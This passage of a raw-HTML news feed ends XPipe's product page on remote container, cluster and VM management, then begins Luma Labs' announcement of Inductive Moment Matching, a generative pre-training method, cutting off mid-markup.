12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Connect to containers on local and remote systems to access their file systems, open shell sessions, and more</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Comes with management capabilities to start, stop, and inspect all your containers, plus the ability to attach to the live logs</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Container state changes can be instantly updated, allowing you to keep track of container statuses</p></li></ul></div></div><div><div><p><img alt="K8s Clusters" width="945" height="720" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FIntegrationsPage%2Fk8s.png&amp;w=1080&amp;q=100 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FIntegrationsPage%2Fk8s.png&amp;w=1920&amp;q=100 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FIntegrationsPage%2Fk8s.png&amp;w=1920&amp;q=100"></p></div><div><h2>Keep track of your clusters</h2><ul><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Automatic detection of your kubectl client and connected clusters, including all pods and containers in a cluster</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Access the file system, log into a shell session, or change the configuration for any container running in your cluster</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Inspect pods or edit pod configurations and instantly apply your changes</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Supports all Kubernetes distributions, including commercial distributions</p></li></ul></div></div><div><div><p><img alt="Virtual Machines" width="950" height="646" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FIntegrationsPage%2Fvms.png&amp;w=1080&amp;q=100 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FIntegrationsPage%2Fvms.png&amp;w=1920&amp;q=100 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FIntegrationsPage%2Fvms.png&amp;w=1920&amp;q=100"></p></div><div><h2>Hypervisors and beyond</h2><ul><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Integrates with VMware Player/Workstation/Fusion hypervisors, Hyper-V, KVM, incus, and Proxmox</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Jump into a shell session of any remote VM via SSH automatically with one click</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Control the state of VMs, attach and monitor VMs in your terminal, all from one dashboard</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Full access to any nested systems and services running on your VMs</p></li></ul></div></div><div><div><p><img alt="Desktop" width="1210" height="720" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FIntegrationsPage%2Fdesktop.png&amp;w=1920&amp;q=100 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FIntegrationsPage%2Fdesktop.png&amp;w=3840&amp;q=100 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FIntegrationsPage%2Fdesktop.png&amp;w=3840&amp;q=100"></p></div><div><h2>Visuals included</h2><ul><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Comes with a built-in VNC viewer with special support for drag-and-drop file transfers</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Supports tunneling VNC and RDP connections over SSH, eliminating the need for exposed VNC/RDP ports</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Integrates with your local RDP client to quickly launch remote desktop sessions and applications</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Supports SSH X11 forwarding, including a bridge to WSL on Windows for optimal native X11 performance</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Run remote graphical applications and environments uniformly for RDP, VNC, and SSH X11 connections</p></li></ul></div></div><div><div><p><img alt="Scripts" width="950" height="720" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FIntegrationsPage%2Fscripts.png&amp;w=1080&amp;q=100 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FIntegrationsPage%2Fscripts.png&amp;w=1920&amp;q=100 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FIntegrationsPage%2Fscripts.png&amp;w=1920&amp;q=100"></p></div><div><h2>Versatile shell scripting</h2><ul><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Includes integrations for all common command shells such as bash, zsh, fish, cmd, PowerShell, and more</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Can set up custom shell init environments so you can fully customize your work environment for every purpose</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Enables the creation of reusable shell scripts, templates, and groups to run in remote system shells</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Make your arsenal of personal scripts available in the PATH on any remote system, without any setup</p></li><li><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256 73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z"></path></svg><p>Supports custom shell commands and custom remote connections by providing your own commands</p></li></ul></div></div></div><p><a href="https://docs.xpipe.io/guide/ssh" target="_blank"><img alt="SSH" loading="lazy" width="80" height="80" decoding="async" data-nimg="1" src="https://xpipe.io/assets/images/HomePage/ssh_icon-dark.svg"><img alt="SSH" loading="lazy" width="80" height="80" decoding="async" data-nimg="1" src="https://xpipe.io/assets/images/HomePage/ssh_icon.svg"></a><a href="https://docs.xpipe.io/guide/docker" target="_blank"><img alt="Docker" loading="lazy" width="80" height="80" decoding="async" data-nimg="1" src="https://xpipe.io/assets/images/HomePage/docker_icon.svg"></a><a href="https://docs.xpipe.io/guide/lxd" target="_blank"><img alt="LXD" loading="lazy" width="80" height="80" decoding="async" data-nimg="1" src="https://xpipe.io/assets/images/HomePage/lxd_icon.svg"></a><a href="https://docs.xpipe.io/guide/podman" target="_blank"><img alt="Podman" loading="lazy" width="80" height="80" decoding="async" data-nimg="1" src="https://xpipe.io/assets/images/HomePage/podman_icon.svg"></a><a href="https://docs.xpipe.io/guide/kubernetes" target="_blank"><img alt="Kubernetes" loading="lazy" width="80" height="80" decoding="async" data-nimg="1" src="https://xpipe.io/assets/images/HomePage/k8sCluster_icon.svg"></a><a href="https://docs.xpipe.io/guide/proxmox" target="_blank"><img alt="Proxmox" loading="lazy" width="80" height="80" decoding="async" data-nimg="1" src="https://xpipe.io/assets/images/HomePage/proxmox_icon-dark.svg"><img alt="Proxmox" loading="lazy" width="80" height="80" decoding="async" data-nimg="1" src="https://xpipe.io/assets/images/HomePage/proxmox_icon.svg"></a><a href="https://docs.xpipe.io/guide/vmware" target="_blank"><img alt="VMware" loading="lazy" width="80" height="80" decoding="async" data-nimg="1" src="https://xpipe.io/assets/images/HomePage/vmware_workstation_icon.svg"></a><a href="https://docs.xpipe.io/guide/kvm" target="_blank"><img alt="libvirt" loading="lazy" width="80" height="80" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fvirsh_icon-80.png&amp;w=96&amp;q=75 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fvirsh_icon-80.png&amp;w=256&amp;q=75 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fvirsh_icon-80.png&amp;w=256&amp;q=75"></a><a href="https://docs.xpipe.io/guide/tailscale" target="_blank"><img alt="Tailscale" loading="lazy" width="80" height="80" decoding="async" data-nimg="1" src="https://xpipe.io/assets/images/HomePage/tailscale_icon-dark.svg"><img alt="Tailscale" loading="lazy" width="80" height="80" decoding="async" data-nimg="1" src="https://xpipe.io/assets/images/HomePage/tailscale_icon.svg"></a><a href="https://docs.xpipe.io/guide/teleport" target="_blank"><img alt="Teleport" loading="lazy" width="80" height="80" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fteleport_icon.png&amp;w=96&amp;q=75 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fteleport_icon.png&amp;w=256&amp;q=75 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fteleport_icon.png&amp;w=256&amp;q=75"></a></p></div></div><div><p><h2>Testimonials</h2><h3>What users have to say</h3></p></div><div><div><p><h2>Highlights</h2><h3>Explore what makes XPipe stand out</h3></p></div><div><div><div><p><img alt="" width="544" height="468" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fcard3.png&amp;w=640&amp;q=75 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fcard3.png&amp;w=1200&amp;q=75 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fcard3.png&amp;w=1200&amp;q=75"></p><div><h5>Cross-platform</h5><p>XPipe is at home on every system. You have access to the same feature set everywhere without compromises. Native installers, portable archives, and packages for all operating systems are available.</p></div></div><div><p><img alt="" width="640" height="427" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fcontainer.png&amp;w=640&amp;q=75 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fcontainer.png&amp;w=1920&amp;q=75 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fcontainer.png&amp;w=1920&amp;q=75"></p><div><h5>Available as a container</h5><p>XPipe Webtop is a web-based desktop environment that can be run in a docker container and accessed from your browser. The desktop environment comes with XPipe and various tools preinstalled and configured.</p></div></div><div><p><img alt="" width="484" height="309" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fcard1.png&amp;w=640&amp;q=75 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fcard1.png&amp;w=1080&amp;q=75 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fcard1.png&amp;w=1080&amp;q=75"></p><div><h5>Your tools first</h5><p>XPipe fully integrates with your toolbox of favourite applications like terminals, editors, git clients, and more. You can keep using them in conjunction with XPipe and don't have to adjust to anything new.</p></div></div></div><div><div><p><img alt="" width="486" height="398" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fcard2.png&amp;w=640&amp;q=75 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fcard2.png&amp;w=1080&amp;q=75 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FHomePage%2Fcard2.png&amp;w=1080&amp;q=75"></p><div><h5>Secure storage</h5><p>All data is stored exclusively on your local system in a cryptographically secure vault. You can also choose to increase security by using a custom passphrase for further encryption.</p></div></div><div><p><img alt="" width="558" height="360" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-key.png&amp;w=640&amp;q=75 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-key.png&amp;w=1200&amp;q=75 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-key.png&amp;w=1200&amp;q=75"></p><div><h5>Password manager integration</h5><p>You are already using a password manager? XPipe is able to retrieve secrets automatically from your password manager via its command-line interface and doesn't have to store secrets itself.</p></div></div><div><p><img alt="" width="640" height="400" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-privacy.png&amp;w=640&amp;q=75 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-privacy.png&amp;w=1920&amp;q=75 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-privacy.png&amp;w=1920&amp;q=75"></p><div><h5>Privacy prioritized</h5><p>There are no outside servers or services involved, all your information stays on your systems. Features like shared vaults are fully selfhosted.</p></div></div></div><div><div><p><img alt="" width="640" height="380" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-selfhosted.png&amp;w=640&amp;q=75 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-selfhosted.png&amp;w=1920&amp;q=75 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-selfhosted.png&amp;w=1920&amp;q=75"></p><div><h5>The selfhosted solution</h5><p>You can host your own remote git repository to synchronize and share vault data across systems and users. XPipe supports advanced git authentication with HTTPS, SSH, keys, smartcards, and more.</p></div></div><div><p><img alt="" width="640" height="424" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-git.png&amp;w=640&amp;q=75 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-git.png&amp;w=1920&amp;q=75 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-git.png&amp;w=1920&amp;q=75"></p><div><h5>Git client integration</h5><p>XPipe integrates with your existing git client installation out of the box. Your existing git configuration is used, so you don't have to configure anything to sync vault via git.</p></div></div><div><p><img alt="" width="640" height="426" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-gears.png&amp;w=640&amp;q=75 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-gears.png&amp;w=1920&amp;q=75 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-gears.png&amp;w=1920&amp;q=75"></p><div><h5>Made for collaboration</h5><p>Changes can be pushed and pulled from your own remote git repository by multiple team members across many systems. XPipe comes with tools you need for conflict resolution in case of merge conflicts.</p></div></div></div><div><div><p><img alt="" width="486" height="322" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-github.png&amp;w=640&amp;q=75 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-github.png&amp;w=1080&amp;q=75 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-github.png&amp;w=1080&amp;q=75"></p><div><h5>Available on GitHub</h5><p>The core of the XPipe application and many other components are open-source and available on GitHub, providing transparency of the implementation.</p></div></div><div><p><img alt="" width="500" height="337" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-stream.png&amp;w=640&amp;q=75 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-stream.png&amp;w=1080&amp;q=75 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-stream.png&amp;w=1080&amp;q=75"></p><div><h5>Continuous updates</h5><p>There is only one continuous build that receives constant updates. Updates are included in all versions for everyone, so you will always receive new features, bug fixes, and security patches.</p></div></div><div><p><img alt="" width="740" height="532" decoding="async" data-nimg="1" srcset="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-settings.png&amp;w=750&amp;q=75 1x, https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-settings.png&amp;w=1920&amp;q=75 2x" src="https://xpipe.io/_next/image?url=%2Fassets%2Fimages%2FFeaturePage%2Fcard-settings.png&amp;w=1920&amp;q=75"></p><div><h5>Detailed documentation</h5><p>Take a look at the official documentation to learn about all the details you're looking for. Includes introductions, guides, and reference pages for all features.</p></div></div></div></div></div><div><div><h5>Get started today</h5><p>Discover for yourself how XPipe can take your workflow to the next level</p></div><div><hr><ul><li><p>© 2025 XPipe UG (haftungsbeschränkt)</p></li><li></li><li></li></ul></div></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Beyond Diffusion: Inductive Moment Matching (182 pts)]]></title>
            <link>https://lumalabs.ai/news/inductive-moment-matching</link>
            <guid>43339563</guid>
            <pubDate>Wed, 12 Mar 2025 03:05:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lumalabs.ai/news/inductive-moment-matching">https://lumalabs.ai/news/inductive-moment-matching</a>, See on <a href="https://news.ycombinator.com/item?id=43339563">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><header><p><span>Authors</span><span>Jiaming Song</span><span>Linqi Zhou</span></p><p>March 11, 2025</p></header><div><p><span>Generated samples on ImageNet-256×256 using 8 steps.</span></p></div></div><div><h3>Fully unlocking the potential of rich multi-modal data</h3><div><p>There is a growing sentiment in the AI community that generative pre-training is reaching a limit. However, we argue that these limits are not due to a lack of data itself, but rather a stagnation in algorithmic innovation. The field remains dominated by just two paradigms since around mid-2020: autoregressive models for discrete signals and diffusion models for continuous signals. This stagnation has created a bottleneck that prevents us from fully unlocking the potential of rich multi-modal data, which in turn limits the progress on multimodal intelligence.</p><p>At Luma, we aim to overcome this algorithmic ceiling through the lens of efficient inference-time compute scaling. Today we are introducing a new method, Inductive Moment Matching (IMM), a pre-training technique that not only delivers superior sample quality compared to diffusion models but also offers over a tenfold increase in sampling efficiency. In contrast to consistency models (CMs), which are unstable as a pre-training technique and require special hyperparameter designs, IMM employs a single objective with enhanced stability across diverse settings.</p></div><div><p><span>Sample quality during training for IMM vs. CM. CM is highly unstable and collapses easily.</span></p></div><div><p>To facilitate future research, we release the code and checkpoints (<a href="https://github.com/lumalabs/imm" target="_blank">https://github.com/lumalabs/imm</a>), a technical paper over the details of the IMM (<a href="https://arxiv.org/abs/2503.07565" target="_blank">https://arxiv.org/abs/2503.07565</a>), and a position paper on how to advance generative pre-training algorithms from an efficient inference-time scaling perspective (<a href="https://arxiv.org/abs/2503.07154" target="_blank">https://arxiv.org/abs/2503.07154</a>).</p></div><h3>How Inductive Moment Matching Works</h3><p>Inference can generally be scaled along two dimensions: extending sequence length (in autoregressive models), and augmenting the number of refinement steps (in diffusion models). While adding more refinement steps significantly boosts diffusion models, simply increasing the model capacity does not yield proportional improvements. This is because diffusion models inherently require more granular steps to converge to an optimal solution, regardless of the networks’ representational power. This shows that, from an inference-time perspective, diffusion models are not optimal in utilizing the networks’ capacity.</p><div><p><span>Diffusion models' performance grows slowly with number of steps, regardless of its model size. In contrast, IMM scales much more efficiently.</span></p></div><p>We illustrate these limitations from an inference perspective by examining the DDIM sampler for diffusion models. In each DDIM iteration, the network first generates a prediction using the current input and timestep, then linearly interpolates this prediction toward that of the next timestep. This constrains the expressive capacity of each iteration as it is linear with respect to the next timestep, ultimately capping performance regardless of the training method employed (see figure below).</p><div><div><p><span>The original DDIM sampler using the diffusion model network is not flexible over the target timestep during inference.</span></p></div><div><p><span>Adding the target timestep allows the sampler to be flexible enough for few step generation.</span></p></div></div><p>We design our new pre-training algorithm by first aiming to mitigate this inference limitation. Our new method, Inductive Moment Matching (IMM), introduces a subtle yet powerful modification: alongside the current timestep, the network also processes the target timestep to jump towards. This change enhances the flexibility of each inference iteration, paving the way for state-of-the-art performance and efficiency. We realize this improvement by incorporating maximum mean discrepancy — a robust moment matching technique that was developed more than 15 years ago.</p><h3>Scaling and Stability</h3><p>We test IMM on various hyperparameters and model architectures. On ImageNet 256x256, IMM achieves 1.99 Frechet Inception Distance (FID) and surpasses diffusion models (2.27 FID) and Flow Matching (2.15 FID) with 30x fewer sampling steps. It similarly achieves state-of-the-art 2-step FID of 1.98 on the standard CIFAR-10 dataset for a model trained from scratch.</p><div><p><img alt="Sample quality versus sampling compute. IMM dominates the optimal frontier for methods with inference-time scaling." loading="lazy" width="2070" height="822" decoding="async" data-nimg="1" srcset="https://lumalabs.ai/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2F2ylxvaa2%2Fproduction%2F176c9baec064e414dbc5000155f53bb9e1977a81-2070x822.png&amp;w=3840&amp;q=75 1x" src="https://lumalabs.ai/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2F2ylxvaa2%2Fproduction%2F176c9baec064e414dbc5000155f53bb9e1977a81-2070x822.png&amp;w=3840&amp;q=75"></p><p><span>Sample quality versus sampling compute. IMM dominates the optimal frontier for methods with inference-time scaling.</span></p></div><p>IMM scales with training and inference compute as well as model size. We show in the figure below FID vs. training and inference compute, and we find strong correlation between compute used and performance.</p><div dir="ltr" data-orientation="horizontal"><div data-state="active" data-orientation="horizontal" role="tabpanel" aria-labelledby="radix-:Rhsvf9uubta:-trigger-c1eeb914a2e8" id="radix-:Rhsvf9uubta:-content-c1eeb914a2e8" tabindex="0"><p><img alt="Scaling compute improves generative quality." loading="lazy" width="2070" height="822" decoding="async" data-nimg="1" srcset="https://lumalabs.ai/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2F2ylxvaa2%2Fproduction%2Fb56e0474f671e939b0085480d52cb77cb78af8c3-2070x822.png&amp;w=3840&amp;q=75 1x" src="https://lumalabs.ai/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2F2ylxvaa2%2Fproduction%2Fb56e0474f671e939b0085480d52cb77cb78af8c3-2070x822.png&amp;w=3840&amp;q=75"></p><p><span>Scaling compute improves generative quality.</span></p></div><div data-state="inactive" data-orientation="horizontal" role="tabpanel" aria-labelledby="radix-:Rhsvf9uubta:-trigger-26f862a95628" id="radix-:Rhsvf9uubta:-content-26f862a95628" tabindex="0"><p><img alt="Scaling compute improves generative quality." loading="lazy" width="2070" height="822" decoding="async" data-nimg="1" srcset="https://lumalabs.ai/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2F2ylxvaa2%2Fproduction%2Faa276f26d771fa044bbfc5838ca82807302ab0ba-2070x822.png&amp;w=3840&amp;q=75 1x" src="https://lumalabs.ai/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2F2ylxvaa2%2Fproduction%2Faa276f26d771fa044bbfc5838ca82807302ab0ba-2070x822.png&amp;w=3840&amp;q=75"></p><p><span>Scaling compute improves generative quality.</span></p></div><div data-state="inactive" data-orientation="horizontal" role="tabpanel" aria-labelledby="radix-:Rhsvf9uubta:-trigger-2169346ea705" id="radix-:Rhsvf9uubta:-content-2169346ea705" tabindex="0"><p><img alt="Scaling compute improves generative quality." loading="lazy" width="2070" height="822" decoding="async" data-nimg="1" 